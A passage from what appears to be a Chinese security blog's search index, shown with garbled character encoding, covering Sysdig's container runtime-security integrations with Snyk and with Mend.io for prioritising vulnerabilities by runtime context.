è¿è¡Œæ—¶æ™ºèƒ½å¯ä»¥æœ‰æ•ˆå‡å°‘æ¼æ´å™ªéŸ³"></p><h2 id="0x03-ç”Ÿäº§ä½¿ç”¨ï¼šé›†æˆä¼˜å…ˆçº§å¯å®ç°ä¼˜åŒ–ä¿®å¤"><a href="#0x03-ç”Ÿäº§ä½¿ç”¨ï¼šé›†æˆä¼˜å…ˆçº§å¯å®ç°ä¼˜åŒ–ä¿®å¤" class="headerlink" title="0x03 ç”Ÿäº§ä½¿ç”¨ï¼šé›†æˆä¼˜å…ˆçº§å¯å®ç°ä¼˜åŒ–ä¿®å¤"></a>0x03 ç”Ÿäº§ä½¿ç”¨ï¼šé›†æˆä¼˜å…ˆçº§å¯å®ç°ä¼˜åŒ–ä¿®å¤</h2><p>æ­£å¦‚ç”Ÿäº§ä¸­æŒç»­å‘ç°çš„å¤§é‡æ¼æ´æ‰€è¯æ˜çš„é‚£æ ·ï¼Œä»¥å‰çš„ä¼˜å…ˆçº§æ–¹æ³•ä½¿å¾—æ¼æ´æŠ¥å‘Šä»ç„¶å—åˆ°å™ªéŸ³æ±¡æŸ“ã€‚å¦‚æœæ²¡æœ‰è¿è¡Œæ—¶ä¸Šä¸‹æ–‡ï¼Œå¼€å‘äººå‘˜æœ€ç»ˆä¼šè¢«ä½é£é™©æˆ–ä¸ç›¸å…³çš„æ¼æ´æ·¹æ²¡ï¼Œç”šè‡³å¯èƒ½ä¼šæµªè´¹èµ„æºæ¥ä¿®å¤å®ƒä»¬ã€‚è€Œä¸”ï¼Œæ›´ç³Ÿç³•çš„æ˜¯ï¼Œå¼€å‘äººå‘˜å¯èƒ½ä¼šé”™è¿‡ä¿®å¤å…³é”®çš„æ¼æ´ã€‚</p><p>é€šè¿‡ä½¿ç”¨ Sysdig å’Œ Snyk æ‰€æä¾›çš„è§£å†³æ–¹æ¡ˆï¼Œå¼€å‘äººå‘˜å¯ä»¥æ ¹æ®è¿è¡Œæ—¶ä¸Šä¸‹æ–‡ï¼Œç²¾ç¡®å®šä½åœ¨ç”Ÿäº§åº”ç”¨ç¨‹åºä¸­è¢«ä½¿ç”¨çš„è½¯ä»¶åŒ…ä»¥åŠå¯è¢«åˆ©ç”¨çš„æ¼æ´ã€‚ç”±äºå¼€å‘äººå‘˜ç°åœ¨å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°å°‘æ•°å‡ ä¸ªä¸èƒ½ç­‰å¾…çš„æ¼æ´ï¼Œå› æ­¤ä»–ä»¬å¯ä»¥é›†ä¸­ç²¾åŠ›æ›´å¿«åœ°ä¿®å¤æ¼æ´ï¼Œå‡å°‘çŒœæµ‹ï¼Œå®Œæˆæ›´å¤šçš„å·¥ä½œã€‚</p><p><img src="/image/image_cQ37UZnq_R.png" alt="å›¾ 3ï¼šSysdig å’Œ Snyk æ‰€æä¾›çš„å®‰å…¨è§£å†³æ–¹æ¡ˆ" title="å›¾3ï¼šSysdigå’ŒSnykæ‰€æä¾›çš„å®‰å…¨è§£å†³æ–¹æ¡ˆ"></p><h2 id="0x04-æ€»ç»“ï¼šå¼¥åˆå¼€å‘ã€å®‰å…¨å’Œè¿è¥ä¹‹é—´çš„å·®è·"><a href="#0x04-æ€»ç»“ï¼šå¼¥åˆå¼€å‘ã€å®‰å…¨å’Œè¿è¥ä¹‹é—´çš„å·®è·" class="headerlink" title="0x04 æ€»ç»“ï¼šå¼¥åˆå¼€å‘ã€å®‰å…¨å’Œè¿è¥ä¹‹é—´çš„å·®è·"></a>0x04 æ€»ç»“ï¼šå¼¥åˆå¼€å‘ã€å®‰å…¨å’Œè¿è¥ä¹‹é—´çš„å·®è·</h2><p>å½“å®‰å…¨çš„ DevOps æ–‡åŒ–èƒ½å¤Ÿä¸ºå›¢é˜Ÿå¸¦æ¥ç§¯æå½±å“æ—¶ï¼Œè¿™ç§æ–‡åŒ–å°±ä¼šå¾—åˆ°å……åˆ†çš„è®¤å¯ã€‚é€šè¿‡æ­¤è§£å†³æ–¹æ¡ˆï¼Œæ‰€æœ‰å›¢é˜Ÿéƒ½èƒ½è·å¾—ä»–ä»¬åœ¨å¼€å‘å’Œè¿è¡Œå®‰å…¨çš„äº‘åŸç”Ÿåº”ç”¨æ–¹é¢æ‰€éœ€çš„æ”¯æŒï¼ŒåŒæ—¶æ¶ˆé™¤äº†é˜»ç¢æ›´å¿«åˆ›æ–°çš„éšœç¢ã€‚</p><p>å®¹å™¨å®‰å…¨è¿è¡Œæ—¶é›†æˆæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ï¼Œå®ƒèƒ½å¤Ÿå¡«è¡¥å·®è·ï¼Œä¸ºå¼€å‘äººå‘˜ã€å®‰å…¨å›¢é˜Ÿå’Œè¿ç»´å›¢é˜Ÿæä¾›å·¨å¤§ä»·å€¼ã€‚é€šè¿‡ä»ç”Ÿäº§ç¯å¢ƒåˆ°å¼€å‘äººå‘˜çš„å®¹å™¨è¿è¡Œæ—¶å¯è§æ€§ï¼Œå¯ä»¥æ¶ˆé™¤æ¼æ´å™ªéŸ³ï¼Œæ›´å¿«åœ°è§£å†³å…³é”®é—®é¢˜ã€‚é€šè¿‡æ›´æœ‰æ•ˆåœ°é™ä½é£é™©ï¼Œå®‰å…¨è¿ç»´å›¢é˜Ÿæ”¹å–„äº†ç»„ç»‡çš„é£é™©æ•å£ï¼Œå¹¶èƒ½æ›´å¥½åœ°ä¸“æ³¨äºæ£€æµ‹å¨èƒçš„æ—©æœŸè¿¹è±¡ã€‚æ­¤å¤–ï¼Œå¼€å‘äººå‘˜å¯ä»¥èŠ‚çœç¼–ç æ—¶é—´ï¼Œæ¨è¿›ä¸šåŠ¡ç›®æ ‡ã€‚</p><p>ä»ç®¡ç†æ¼æ´åˆ°æ£€æµ‹å’Œå“åº”å®æ—¶å¨èƒï¼Œä»¥åŠç›‘æ§å’Œæ•…éšœæ’é™¤äº‘åŸç”Ÿç¯å¢ƒï¼ŒSysdig å’Œ Snyk æä¾›äº†æœ€å…¨é¢çš„å®‰å…¨ä¿éšœï¼š</p><ul><li><strong>ä»ä»£ç åˆ°è¿è¡Œæ—¶ä¿æŠ¤å®¹å™¨å®‰å…¨ï¼š</strong> å°†å®‰å…¨æ€§æ•´åˆåˆ°å®¹å™¨å’Œ Kubernetes ç”Ÿå‘½å‘¨æœŸä¸­â€”â€”ä»å®‰å…¨çš„åŸºç¡€é•œåƒåˆ°æ¼æ´ä¼˜å…ˆçº§æ’åºï¼Œå†åˆ°åœ¨è¿è¡Œæ—¶æ£€æµ‹å®æ—¶å¨èƒå’Œæ–°æ¼æ´ã€‚</li><li><strong>ä»ä¸€å¼€å§‹å°±å»ºç«‹å®‰å…¨æ€§ï¼š</strong> æ ¹æ®ç”Ÿäº§ç¯å¢ƒä¸­çœŸæ­£å¿…è¦çš„å†…å®¹ï¼Œåœ¨æ„å»ºè¿‡ç¨‹ä¸­è§£å†³æ¼æ´å¹¶åˆ é™¤ä¸å¿…è¦çš„è½¯ä»¶åŒ…ã€‚</li><li><strong>å…·å¤‡è¿è¡Œæ—¶ä¿æŠ¤ï¼š</strong> ç¡®ä¿éƒ¨ç½²äº†å¨èƒæ£€æµ‹ï¼Œä»¥é˜²æ­¢æ”»å‡»ï¼Œç›´åˆ°æ–°çš„å…³é”®æ¼æ´å’Œå—é›¶æ—¥åˆ©ç”¨æ”»å‡»çš„æ¼æ´å¾—åˆ°è§£å†³ã€‚</li><li><strong>ç»Ÿä¸€ä¼˜å…ˆçº§</strong>ï¼šè·å¾—é£é™©çš„ç»Ÿä¸€è§†å›¾ï¼Œå°†è¿è¡Œæ—¶ä¸Šä¸‹æ–‡ä¸æ¼æ´æ£€æŸ¥é…å¯¹ï¼Œä»¥ä¼˜å…ˆå¤„ç†é‡è¦çš„è­¦æŠ¥ã€‚å½“å›¢é˜ŸçŸ¥é“ç°åœ¨éœ€è¦è§£å†³ä»€ä¹ˆé—®é¢˜ï¼Œè€Œä¸æ˜¯åœ¨ä¸€å‘¨åï¼Œä»¥åŠä»€ä¹ˆåªæ˜¯å¯ä»¥å¿½ç•¥çš„å™ªéŸ³æ—¶ï¼Œå¼€å‘äººå‘˜å’Œè¿ç»´å·¥ä½œè´Ÿè½½å°±å˜å¾—æ›´åŠ å¯ç®¡ç†ã€‚</li></ul><p>æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼Œè¯·è§‚çœ‹ YouTube è§†é¢‘ï¼š<a href="https://www.youtube.com/watch?v=oAGoEXjAqzg" title="Containerized AppSec From Code to Production With Snyk, Sysdig and AWS">Containerized AppSec From Code to Production With Snyk, Sysdig and AWS</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>å®¹å™¨å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mend.io å’Œ Sysdig æ¨å‡ºå®¹å™¨å®‰å…¨è”åˆè§£å†³æ–¹æ¡ˆ</title>
    <link href="/2024/05/11/Mend-io-%E5%92%8C-Sysdig-%E6%8E%A8%E5%87%BA%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E8%81%94%E5%90%88%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <url>/2024/05/11/Mend-io-%E5%92%8C-Sysdig-%E6%8E%A8%E5%87%BA%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E8%81%94%E5%90%88%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>2024 å¹´ 5 æœˆ 7 æ—¥ï¼Œåœ¨ <a href="https://www.rsaconference.com/">RSA å¤§ä¼š</a>ä¸Šï¼Œ<a href="http://mend.io/">Mend.io</a> å’Œ <a href="https://sysdig.com/">Sysdig</a>æ¨å‡ºäº†ä¸€é¡¹å®¹å™¨å®‰å…¨è”åˆè§£å†³æ–¹æ¡ˆï¼Œä»¥å¸®åŠ©å¼€å‘äººå‘˜ã€DevOps å’Œå®‰å…¨å›¢é˜ŸåŠ é€Ÿä»å¼€å‘åˆ°éƒ¨ç½²çš„å®‰å…¨è½¯ä»¶äº¤ä»˜è¿‡ç¨‹ã€‚</p><p>è¯¥è§£å†³æ–¹æ¡ˆå°† Sysdig çš„è¿è¡Œæ—¶ä¸Šä¸‹æ–‡ä¸ Mend Container ç›¸ç»“åˆï¼Œä¸ºç”¨æˆ·æä¾›è·¨å¼€å‘ç¯å¢ƒå’Œç”Ÿäº§ç¯å¢ƒçš„å“è¶Šçš„ã€ç«¯åˆ°ç«¯çš„ã€åŸºäºé£é™©çš„æ¼æ´ä¼˜å…ˆçº§æ’åºå’Œä¿®å¤ã€‚</p><h2 id="0x01-èƒŒæ™¯ï¼šä¿æŠ¤å·¥ä½œè´Ÿè½½é¢ä¸´çš„æ—¥ç›Šä¸¥å³»çš„æŒ‘æˆ˜"><a href="#0x01-èƒŒæ™¯ï¼šä¿æŠ¤å·¥ä½œè´Ÿè½½é¢ä¸´çš„æ—¥ç›Šä¸¥å³»çš„æŒ‘æˆ˜" class="headerlink" title="0x01 èƒŒæ™¯ï¼šä¿æŠ¤å·¥ä½œè´Ÿè½½é¢ä¸´çš„æ—¥ç›Šä¸¥å³»çš„æŒ‘æˆ˜"></a>0x01 èƒŒæ™¯ï¼šä¿æŠ¤å·¥ä½œè´Ÿè½½é¢ä¸´çš„æ—¥ç›Šä¸¥å³»çš„æŒ‘æˆ˜</h2><p>2022 å¹´ 3 æœˆ 7 æ—¥ï¼ŒGartner åœ¨ã€Š<a href="https://www.gartner.com/en/newsroom/press-releases/2022-03-07-gartner-identifies-top-security-and-risk-management-trends-for-2022">Gartner Identifies Top Security and Risk Management Trends for 2022</a>ã€‹ä¸­é¢„æµ‹ï¼š2025 å¹´ï¼Œ45% çš„å¤§å‹ä¼ä¸šçš„è½¯ä»¶ä¾›åº”é“¾å°†é­å—æ”»å‡»ã€‚</p><p>2024 å¹´ 2 æœˆ 21 æ—¥ï¼ŒCoalition åœ¨ã€Š<a href="https://www.computerweekly.com/news/366570913/CVE-volumes-set-to-increase-25-this-year">CVE volumes set to increase 25% this year</a>ã€‹ä¸­é¢„è®¡ï¼š2024 å¹´ CVE æ€»æ•°å°†å¢åŠ  25%ã€‚éšç€æ–°çš„æ¼æ´ä¸æ–­æ¶Œç°ï¼Œå¼€å‘äººå‘˜å’Œå®‰å…¨å›¢é˜Ÿéƒ½éœ€è¦æ›´å¥½çš„æ–¹æ³•æ¥è¿‡æ»¤å™ªéŸ³ï¼Œå¹¶å®ç°å®‰å…¨äº¤ä»˜çš„æœ€ç»ˆç›®æ ‡ã€‚</p><p>å¨èƒè¡Œä¸ºè€…ä¸æ–­å¯»æ‰¾å¼•å…¥å’Œåˆ©ç”¨æ¼æ´æ¥æ¸—é€ç›®æ ‡ç»„ç»‡ç½‘ç»œçš„æ–¹æ³•ã€‚éšç€å®¹å™¨çš„ä½¿ç”¨ä¸æ–­å¢é•¿ï¼Œå®ƒä»¬å°†æˆä¸ºæ¶æ„ä»£ç çš„ç†æƒ³äº¤ä»˜å·¥å…·ã€‚</p><p>Mend.io ä¼ä¸šå¼€å‘æ‰§è¡Œå‰¯æ€»è£ Vered Shaked è¯´ï¼šâ€œéšç€ç»„ç»‡è¶Šæ¥è¶Šå¤šåœ°ä½¿ç”¨å®¹å™¨å’Œ Kubernetes ç­‰äº‘åŸç”ŸæœåŠ¡ï¼Œä»–ä»¬å¾ˆéš¾è·Ÿä¸Šæ£€æµ‹åˆ°çš„å¤§é‡å®‰å…¨é—®é¢˜çš„æ­¥ä¼ï¼Œè¯¥è§£å†³æ–¹æ¡ˆå…±åŒä¸ºæ—¶é—´å’Œèµ„æºæœ‰é™çš„ç»„ç»‡æä¾›äº†æ›´æœ‰æ•ˆçš„æ–¹æ³•æ¥é’ˆå¯¹å®é™…é£é™©è¿›è¡Œè¡¥æ•‘ã€‚é€šè¿‡æä¾›å¯¹è¿è¡Œæ—¶æ£€æµ‹åˆ°çš„é£é™©çš„æ´å¯Ÿï¼Œå®‰å…¨å›¢é˜Ÿå¯ä»¥æ›´æœ‰ä¿¡å¿ƒåœ°è¿›è¡Œé¢„é˜²å’Œé˜²å¾¡ã€‚â€</p><p>Sysdig æŠ€æœ¯è”ç›Ÿå‰¯æ€»è£ Bryan Smoltz è¡¨ç¤ºï¼šâ€œå½’æ ¹ç»“åº•ï¼Œå®‰å…¨æ€§éœ€è¦åœ¨ä¸å‡æ…¢äº§å“å¼€å‘é€Ÿåº¦çš„æƒ…å†µä¸‹ä¿æŠ¤ç»„ç»‡ï¼Œä½†ç”±äºç¼ºä¹è¿è¡Œæ—¶ä¸Šä¸‹æ–‡ï¼Œå›¢é˜Ÿå¾ˆéš¾ç¡®å®šä¼˜å…ˆçº§ã€‚é€šè¿‡çªå‡ºæ˜¾ç¤ºæ¼æ´å¹¶æ ¹æ®è¿è¡Œæ—¶æ´å¯Ÿç¡®å®šä¼˜å…ˆçº§ï¼Œæˆ‘ä»¬ä¸ Mend.io çš„åˆä½œä½¿ç”¨æˆ·èƒ½å¤Ÿç®€åŒ–å®‰å…¨æ€§å¹¶åŠ å¿«è¡ŒåŠ¨é€Ÿåº¦ã€‚â€</p><h2 id="0x02-å·¥ä½œåŸç†ï¼šMend-io-å’Œ-Sysdig-é›†æˆ"><a href="#0x02-å·¥ä½œåŸç†ï¼šMend-io-å’Œ-Sysdig-é›†æˆ" class="headerlink" title="0x02 å·¥ä½œåŸç†ï¼šMend.io å’Œ Sysdig é›†æˆ"></a>0x02 å·¥ä½œåŸç†ï¼š<strong>Mend.io å’Œ Sysdig é›†æˆ</strong></h2><p>é¦–å…ˆï¼ŒSysdig é€šè¿‡è¿è¡Œæ—¶çš„è§†è§’ï¼Œå¯¹å®¹å™¨è¿›è¡Œåˆ†æï¼Œä»¥ç¡®å®šæ‰€ä½¿ç”¨çš„è½¯ä»¶åŒ…å’Œæœªä½¿ç”¨çš„è½¯ä»¶åŒ…ã€‚ç„¶åï¼Œå¼€å‘äººå‘˜å€ŸåŠ© Mend.ioï¼Œé’ˆå¯¹æ¼æ´çš„å¨èƒç­‰çº§ã€å¯åˆ©ç”¨æ€§ã€å¯è¾¾æ€§å’Œè¿è¡Œæ—¶æ›å…‰åº¦ï¼ˆå³è¿è¡Œæ—¶è½¯ä»¶åŒ…çš„ä½¿ç”¨æƒ…å†µï¼‰ç­‰å› ç´ æ¥å®šä½æ¼æ´å’ŒçœŸå®çš„é£é™©ï¼Œæœ€ç»ˆè¾¾æˆç›¸åº”çš„ä¿®å¤ç›®æ ‡ã€‚</p><p><img src="/image/image_CUQmQ-Tyje.png" alt="å›¾ 1ï¼šmend.io å’Œ sysdig çš„é›†æˆ" title="å›¾1ï¼šmend.io å’Œsysdig çš„é›†æˆ"></p><p>Mend Container åœ¨é›†æˆäº† Mend SCA å’Œ Sysdig Runtime Insights API åï¼Œå¯ä»¥å°†è½¯ä»¶åŒ…çš„è¿è¡Œæ—¶ä¸Šä¸‹æ–‡æ•´åˆåˆ° Mend SCA äº§å“å’Œå®¹å™¨æ‰«æç»“æœä¸­ã€‚å¼€å‘äººå‘˜å’Œå®‰å…¨å›¢é˜Ÿé€šè¿‡æ‰€æä¾›çš„è¿è¡Œæ—¶ä¸Šä¸‹æ–‡è§†å›¾ï¼Œå¯ä»¥ç¡®å®šåº”ç”¨ç¨‹åºåœ¨ç”Ÿäº§ç¯å¢ƒä¸­çš„éƒ¨ç½²å’Œè¡Œä¸ºï¼Œå¹¶è®¾ç½®æ¼æ´çš„ä¿®å¤ä¼˜å…ˆç­‰çº§å’Œè¯„åˆ†ã€‚</p><p>Mend.io ä¸ä»…å¯ä»¥å¸®åŠ©å›¢é˜Ÿè®¡ç®— CVSS åˆ†æ•°ï¼Œè¿˜å¯ä»¥é€šè¿‡åˆ†æå¯è¾¾æ€§ã€å¯åˆ©ç”¨æ€§å’Œè¿è¡Œæ—¶æ›å…‰åº¦ç­‰æ–¹é¢è®¡ç®—é£é™©ï¼Œå®ƒå¯ä»¥ä½¿æ‚¨èƒ½å¤Ÿè¶…è¶Šç†è®ºé£é™©ï¼Œå…·ä½“äº†è§£åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡ä¸­çš„é£é™©ã€‚</p><p><img src="/image/image_387wRZbdO-.png" alt="å›¾ 2ï¼šmend.io äº§å“çš„ä½¿ç”¨ç•Œé¢" title="å›¾2ï¼š mend.io äº§å“çš„ä½¿ç”¨ç•Œé¢"></p><p>æ­¤å¤–ï¼ŒMend Container èƒ½å¤Ÿæä¾›åº”ç”¨ç¨‹åºçš„æ‰€æœ‰æƒè§è§£ï¼Œå¸®åŠ©å®‰å…¨å›¢é˜Ÿè¯†åˆ«æ˜“å—æ”»å‡»çš„åŒ…çš„ç›¸å…³å­˜å‚¨åº“å’Œåº”ç”¨ç¨‹åºæ‰€æœ‰æƒã€‚è¿™äº›è§è§£å¯ä»¥å®ç°è·¨å›¢é˜Ÿä¿®å¤è¿‡ç¨‹çš„è‡ªåŠ¨åŒ–å’ŒåŠ é€Ÿã€‚</p><h2 id="0x03-å…³äº-Mend-io"><a href="#0x03-å…³äº-Mend-io" class="headerlink" title="0x03 å…³äº Mend.io"></a>0x03 å…³äº Mend.io</h2><p>Mend.io æ‹¥æœ‰åå¤šå¹´å¸®åŠ©å…¨çƒç»„ç»‡æ„å»ºä¸–ç•Œä¸€æµçš„åº”ç”¨å®‰å…¨é¡¹ç›®çš„ç»éªŒã€‚Mend Container å¯è¯†åˆ«å…³é”®å®‰å…¨æ¼æ´å¹¶ç¡®å®šå…¶ä¼˜å…ˆçº§ï¼Œæä¾›å¯è¡Œçš„ä¿®å¤å»ºè®®ä»¥åŠå¼€æºåº“å’Œä¾èµ–é¡¹çš„å…¨é¢ä¿¡æ¯ã€‚</p><p>Mend.io çš„ä¼ä¸šåº”ç”¨ç¨‹åºå®‰å…¨å·¥å…·å¥—ä»¶å—åˆ° IBMã€Google å’Œ Capital One ç­‰å…¨çƒé¢†å…ˆå…¬å¸çš„ä¿¡èµ–ï¼Œæ—¨åœ¨å¸®åŠ©æ‚¨æ„å»ºå’Œç®¡ç†æˆç†Ÿã€ä¸»åŠ¨çš„ AppSec è®¡åˆ’ã€‚</p><p>Mend äº†è§£å¼€å‘äººå‘˜å’Œå®‰å…¨å›¢é˜Ÿçš„ä¸åŒ AppSec è¦æ±‚ã€‚ä¸å…¶ä»–è¿«ä½¿æ¯ä¸ªäººä½¿ç”¨å•ä¸€å·¥å…·çš„ AppSec è§£å†³æ–¹æ¡ˆä¸åŒï¼ŒMend é€šè¿‡ä¸ºæ¯ä¸ªå›¢é˜Ÿæä¾›ä¸åŒä½†äº’è¡¥çš„å·¥å…·æ¥å¸®åŠ©ä»–ä»¬åè°ƒå·¥ä½œï¼Œä½¿ä»–ä»¬èƒ½å¤Ÿåœæ­¢è¿½é€æ¼æ´å¹¶å¼€å§‹ä¸»åŠ¨ç®¡ç†åº”ç”¨ç¨‹åºé£é™©ã€‚</p><h2 id="0x04-å…³äº-Sysdig"><a href="#0x04-å…³äº-Sysdig" class="headerlink" title="0x04 å…³äº Sysdig"></a>0x04 å…³äº Sysdig</h2><p>Sysdig å¯ä»¥è®©æ‚¨æ·±å…¥äº†è§£è¿è¡Œæ—¶å‘ç”Ÿçš„æƒ…å†µã€‚ä½œä¸º Falco å¼€æºçš„åˆ›å»ºè€…ï¼ŒSysdig æ˜¯é€šè¿‡å…¶å…¨é¢çš„è¿è¡Œæ—¶å®‰å…¨æ€§å®æ—¶ç›‘æ§å¼‚å¸¸è¡Œä¸ºã€æ½œåœ¨å®‰å…¨å¨èƒå’Œåˆè§„è¿è§„è¡Œä¸ºçš„å…ˆé©±ã€‚</p><p>åœ¨äº‘ä¸­ï¼Œæ¯ä¸€ç§’éƒ½å¾ˆé‡è¦ã€‚æ”»å‡»ä»¥æå¿«çš„é€Ÿåº¦ä¼ æ’­ï¼Œå®‰å…¨å›¢é˜Ÿå¿…é¡»åœ¨ä¸å‡æ…¢ä¸šåŠ¡é€Ÿåº¦çš„æƒ…å†µä¸‹ä¿æŠ¤ä¸šåŠ¡ã€‚Sysdig å®æ—¶é˜»æ­¢äº‘æ”»å‡»ï¼Œé€šè¿‡è¿è¡Œæ—¶æ´å¯Ÿå’Œå¼€æº Falco å³æ—¶æ£€æµ‹é£é™©å˜åŒ–ã€‚</p><p>Sysdig åœ¨ Gartner Peer Insightsï¼ˆå®¢æˆ·ä¹‹å£°ï¼‰æŠ¥å‘Šä¸­è¢«è¯„ä¸º CSPM ç¬¬ä¸€åï¼Œå®ƒå°†è·¨äº‘å·¥ä½œè´Ÿè½½ã€èº«ä»½å’ŒæœåŠ¡çš„ä¿¡å·å…³è”èµ·æ¥ï¼Œä»¥å‘ç°éšè—çš„æ”»å‡»è·¯å¾„å¹¶ä¼˜å…ˆè€ƒè™‘çœŸæ­£çš„é£é™©ã€‚ä»é¢„é˜²åˆ°é˜²å¾¡ï¼ŒSysdig å¸®åŠ©ä¼ä¸šä¸“æ³¨äºé‡è¦çš„äº‹æƒ…ï¼šåˆ›æ–°ã€‚</p><h2 id="0x05-æ€»ç»“"><a href="#0x05-æ€»ç»“" class="headerlink" title="0x05 æ€»ç»“"></a>0x05 æ€»ç»“</h2><p>ç”±äºæ½œåœ¨å¨èƒåœ¨æ•´ä¸ªè½¯ä»¶ç”Ÿå‘½å‘¨æœŸï¼ˆåŒ…æ‹¬ç”Ÿäº§å‰å’Œç”Ÿäº§åï¼‰ä¸­ä»¥å¤šç§å½¢å¼å‡ºç°ï¼Œç»„ç»‡éœ€è¦ä¸€ç§æ–¹æ³•æ¥ä¿æŠ¤åº”ç”¨ç¨‹åºå…å—å¤šç§å½¢å¼çš„é£é™©ã€‚Mend.io å’Œ Sysdig å…±åŒå¸®åŠ©ç”¨æˆ·è´¯å½»â€œShift Leftâ€å’Œâ€œShield Rightâ€å®‰å…¨ç­–ç•¥ã€‚</p><p>å³ä½¿æ˜¯æœ€å¥½çš„ AppSec ç¨‹åºæœ¬èº«ä¹Ÿæ˜¯ä¸å¤Ÿçš„ï¼Œå› ä¸ºä¸å¯èƒ½é˜²èŒƒç”Ÿäº§ä¸­å¯èƒ½å‡ºç°çš„æ‰€æœ‰æœªçŸ¥å¨èƒã€‚åœ¨è¿™é‡Œï¼ŒSysdig çš„è¿è¡Œæ—¶å®‰å…¨æ€§åœ¨è·¨å®¹å™¨å’Œäº‘å®æ—¶æ£€æµ‹å¨èƒæ–¹é¢å‘æŒ¥ç€å…³é”®ä½œç”¨ã€‚ â€œç›¾æƒâ€é‡ç‚¹å…³æ³¨é¢„é˜²å®‰å…¨äº‹ä»¶çš„æ“ä½œå®è·µï¼Œä»¥åŠå®‰å…¨ç›‘æ§å’Œè¡Œä¸ºåˆ†æï¼Œä»¥åœ¨äº‹ä»¶å‘ç”Ÿæ—¶æ£€æµ‹å’Œå“åº”ã€‚</p><p>å€ŸåŠ© Sysdig å’Œ Mend.ioï¼Œå®‰å…¨å›¢é˜Ÿæ—¢å¯ä»¥å¼ºåŒ–å®‰å…¨æ€åŠ¿ï¼Œé˜²æ‚£äºæœªç„¶ï¼Œåˆå¯ä»¥æŒç»­ç›‘æ§æ´»åŠ¨é£é™©ï¼Œä»¥ç¡®ä¿äº‘ç¯å¢ƒå’Œåº”ç”¨ç¨‹åºçš„å®‰å…¨ã€‚é‡‡ç”¨ç»¼åˆæ–¹æ³•è¯†åˆ«å’Œè§£å†³å¼€å‘å’Œç”Ÿäº§ç¯å¢ƒä¸­çš„æ¼æ´ï¼Œåˆä½œå®¢æˆ·å°†è·å¾—ä»¥ä¸‹ä¼˜åŠ¿ï¼š</p><ul><li>è¿è¡Œæ—¶ä¿æŠ¤ã€‚é€šè¿‡å¯¹å®¹å™¨åŒ–åº”ç”¨ç¨‹åºè¿›è¡ŒæŒç»­ç›‘æ§ï¼Œå®æ—¶ä¼˜åŒ–æ€§èƒ½ï¼Œç¡®ä¿å“åº”è¿…é€Ÿå’Œå®‰å…¨çš„ç¯å¢ƒã€‚</li><li>æ¼æ´å™ªéŸ³å‡å°‘ 95%ã€‚æ‘’å¼ƒæ‹–æ…¢å’Œä»¤å¼€å‘äººå‘˜æ²®ä¸§çš„å¤šä½™å™ªéŸ³ã€‚ä¸ºä»–ä»¬æä¾›å…³äºè¿è¡Œæ—¶åŠ è½½çš„åŒ…çš„æ´è§ï¼Œä½¿ä»–ä»¬èƒ½å¤Ÿæœ‰æ•ˆåœ°ä¼˜å…ˆå¤„ç†å…³é”®æ¼æ´ã€‚</li><li>ä»å¼€å‘åˆ°éƒ¨ç½²å…¨é¢è¦†ç›–ã€‚å®‰å…¨å›¢é˜Ÿå¯ä»¥å‡†ç¡®å®šä½æ¼æ´æœ€åˆæ˜¯åœ¨å“ªä¸ªå­˜å‚¨åº“å’Œåº”ç”¨ç¨‹åºæ‰€æœ‰è€…å¼•å…¥åˆ°å¼€å‘ä¸­çš„ï¼Œä»äº‘ç«¯åˆ°ä»£ç ï¼ŒåŠ é€Ÿæ•´ä¸ªä¿®å¤è¿‡ç¨‹ã€‚</li><li>éƒ¨ç½²ä¼˜å…ˆçº§æ§åˆ¶ã€‚æŒæ§åº”ç”¨ç¨‹åºéƒ¨ç½²ä¼˜å…ˆçº§ï¼Œæé«˜æ•ˆç‡ï¼Œä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿç¡®è®¤ç”Ÿäº§éƒ¨ç½²å¹¶è®¾ç½®é¦–é€‰ä¿®å¤ä¼˜å…ˆçº§ã€‚</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>å®¹å™¨å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
